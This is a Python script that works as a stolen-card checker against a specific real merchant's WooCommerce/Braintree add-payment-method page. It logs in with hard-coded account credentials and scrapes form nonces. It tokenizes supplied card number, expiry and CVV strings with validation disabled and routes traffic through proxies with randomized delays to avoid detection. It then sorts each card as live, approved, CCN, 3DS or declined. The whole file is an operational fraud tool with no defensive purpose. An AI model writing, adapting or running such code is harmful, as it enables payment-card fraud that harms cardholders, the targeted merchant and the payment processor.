import base64
import requests
import random
import time
import json
import re
from faker import Faker
from bs4 import BeautifulSoup
from html import unescape
from proxy_manager import get_proxy_dict

fake = Faker()

B3_ACCOUNTS = [
    ('keshav@pinta1068.com', 'Keshav@1068#'),
    ('keshav1@pinta1068.com', 'Keshav@1068#'),
    ('keshav2@pinta1068.com', 'Keshav@1068#'),
]

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

def extract_braintree_token(response_text):
    pattern = r'wc_braintree_client_token\s*=\s*\["([^"]+)"\]'
    match = re.search(pattern, response_text)
    if not match:
        return None
    token_base64 = match.group(1)
    try:
        decoded_json = base64.b64decode(token_base64).decode('utf-8')
        data = json.loads(decoded_json)
        return data
    except Exception as e:
        return None

def charge_resp(result):
    error_message = ""
    response = ""

    try:
        if "Redirect" in result:
            response = "LIVE"
            error_message = ""
        else:
            try:
                json_resp = json.loads(result)
                if "error" in json_resp and "message" in json_resp["error"]:
                    raw_html = unescape(json_resp["error"]["message"])
                    soup = BeautifulSoup(raw_html, "html.parser")
                    div_success = soup.find("div", class_="woocommerce-message")
                    if div_success:
                        response = div_success.get_text(separator=" ", strip=True)
                    div_error = soup.find("div", class_="message-container")
                    if div_error:
                        error_message = div_error.get_text(separator=" ", strip=True)
            except Exception:
                try:
                    soup = BeautifulSoup(unescape(result), "html.parser")
                    ul = soup.find("ul", class_="woocommerce-error")
                    if ul:
                        li = ul.find("li")
                        if li:
                            error_message = li.get_text(separator=" ", strip=True)
                    else:
                        div_success = soup.find("div", class_="woocommerce-message")
                        if div_success:
                            response = div_success.get_text(separator=" ", strip=True)
                        else:
                            div_error = soup.find("div", class_="message-container")
                            if div_error:
                                error_message = div_error.get_text(separator=" ", strip=True)
                except Exception:
                    pass

            if "Reason: " in error_message:
                _, _, after = error_message.partition("Reason: ")
                error_message = after.strip()

            if error_message:
                response = error_message
            else:
                if (
                    '{"status":"SUCCESS",' in result
                    or '"status":"success"' in result
                    or 'Thank you' in result
                    or '"result":"success"' in result
                    or 'Payment method successfully added.' in result
                    or '{"success":true,"' in result
                ):
                    response = "LIVE"
                elif "Thank you for your donation" in result:
                    response = "PAYMENT SUCCESSFUL"
                else:
                    response = result[:100] if len(result) > 100 else result

        return response

    except Exception as e:
        return str(e)

def create_payment_method(fullz, session, proxies, account_email=None, account_password=None):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        first = fake.first_name()
        last = fake.last_name()
        
        if not account_email:
            account_email = 'keshav@pinta1068.com'
        if not account_password:
            account_password = 'Keshav@1068#'

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        time.sleep(random.uniform(1, 2))
        
        for attempt in range(3):
            try:
                response = session.get('https://parts.lagunatools.com/login/', headers=headers, timeout=45, proxies=proxies)
                break
            except:
                if attempt == 2:
                    return "Site connection failed"
                time.sleep(3)
        
        login = gets(response.text, '<input type="hidden" id="user-registration-login-nonce" name="user-registration-login-nonce" value="', '"')

        if not login:
            return "Failed to get login nonce"

        headers['content-type'] = 'application/x-www-form-urlencoded'
        headers['origin'] = 'https://parts.lagunatools.com'
        headers['referer'] = 'https://parts.lagunatools.com/login/'
        
        data = {
            'username': account_email,
            'password': account_password,
            'user-registration-login-nonce': login,
            '_wp_http_referer': '/login/',
            'login': 'Login',
            'redirect': '',
        }
        session.post('https://parts.lagunatools.com/login/', headers=headers, data=data, timeout=45, proxies=proxies)
        time.sleep(0.5)
        session.get('https://parts.lagunatools.com/account/', headers=headers, timeout=45, proxies=proxies)
        session.get('https://parts.lagunatools.com/customer-account/payment-methods/', headers=headers, timeout=30, proxies=proxies)
        
        headers['referer'] = 'https://parts.lagunatools.com/customer-account/payment-methods/'
        response = session.get('https://parts.lagunatools.com/customer-account/add-payment-method/', headers=headers, timeout=30, proxies=proxies)
        
        nonce = gets(response.text, '<input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="', '"')
        token_data = extract_braintree_token(response.text)
        if token_data is None:
            return "Failed to extract authorization fingerprint"
        authorization_fingerprint = token_data.get('authorizationFingerprint')

        if not authorization_fingerprint:
            return "No authorization fingerprint"

        headers_braintree = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': f'Bearer {authorization_fingerprint}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': 'a5deb879-1007-406e-8830-769fff810eae',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mes,
                        'expirationYear': ano,
                        'cvv': cvv,
                        'billingAddress': {
                            'postalCode': '10038-2609',
                            'streetAddress': '156 William St',
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        response = session.post('https://payments.braintree-api.com/graphql', headers=headers_braintree, json=json_data, timeout=30, proxies=proxies)
        token = gets(response.text, '"token":"', '"')

        if not token:
            error_match = re.search(r'"message":"([^"]+)"', response.text)
            if error_match:
                return error_match.group(1)
            return "Failed to tokenize card"

        headers_submit = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://parts.lagunatools.com',
            'referer': 'https://parts.lagunatools.com/customer-account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        data_submit = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': token,
            'braintree_cc_device_data': '{"correlation_id":"a5deb879-1007-406e-8830-769fff81"}',
            'braintree_cc_3ds_nonce_key': '',
            'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/crtwxgkstbhhh694/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/crtwxgkstbhhh694"},"merchantId":"crtwxgkstbhhh694","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"crtwxgkstbhhh694","supportedNetworks":["visa","mastercard","amex","discover"]},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["American Express","Discover","JCB","MasterCard","Visa","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":true,"paypal":{"displayName":"Laguna Tools, Inc.","clientId":"Aftmqe5eIrY7WXZ1W02iq9ApNKZ4wzgvDlMEtDcP9n4PVrXJgRnF9XEEnzaG1rQ9mKvXBHeesQTo77ID","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"lagunatoolsinc","payeeEmail":null,"currencyIsoCode":"USD"}}',
            'woocommerce-add-payment-method-nonce': nonce,
            '_wp_http_referer': '/customer-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }

        response = session.post(
            'https://parts.lagunatools.com/customer-account/add-payment-method/',
            headers=headers_submit,
            data=data_submit,
            timeout=30,
            proxies=proxies,
            allow_redirects=False
        )

        if response.status_code in (301, 302, 303, 307, 308):
            redirect_location = response.headers.get("location", "")
            return f"Redirect to: {redirect_location}"

        return response.text

    except Exception as e:
        return str(e)

def gatet(ccx, account_index=None):
    try:
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) != 4:
            return {'card': ccx, 'status': 'INVALID', 'message': 'Invalid format', 'approved': False}
        
        cc = parts[0].strip()
        mes = parts[1].strip().zfill(2)
        ano = parts[2].strip()
        cvv = parts[3].strip()
        
        if len(ano) == 2:
            ano = '20' + ano
        
        fullz = f"{cc}|{mes}|{ano}|{cvv}"
        
        proxies = get_proxy_dict()
        session = requests.Session()
        
        if account_index is not None and 0 <= account_index < len(B3_ACCOUNTS):
            account_email, account_password = B3_ACCOUNTS[account_index]
        else:
            account_email, account_password = B3_ACCOUNTS[0]
        
        result = create_payment_method(fullz, session, proxies, account_email, account_password)
        response = charge_resp(result)
        
        if response == "LIVE" or "Payment method successfully added" in response or "PAYMENT SUCCESSFUL" in response:
            return {'card': ccx, 'status': 'APPROVED', 'message': response, 'approved': True}
        elif "Redirect" in result:
            return {'card': ccx, 'status': 'APPROVED', 'message': 'LIVE', 'approved': True}
        elif "CVV" in response.upper() or "CVC" in response.upper() or "security code" in response.lower():
            return {'card': ccx, 'status': 'CCN', 'message': response, 'approved': True}
        elif "3D" in response.upper() or "3d" in response or "secure" in response.lower():
            return {'card': ccx, 'status': '3DS', 'message': response, 'approved': True}
        elif "insufficient" in response.lower():
            return {'card': ccx, 'status': 'APPROVED', 'message': response, 'approved': True}
        else:
            return {'card': ccx, 'status': 'DECLINED', 'message': response, 'approved': False}
            
    except Exception as e:
        return {'card': ccx, 'status': 'ERROR', 'message': str(e)[:50], 'approved': False}
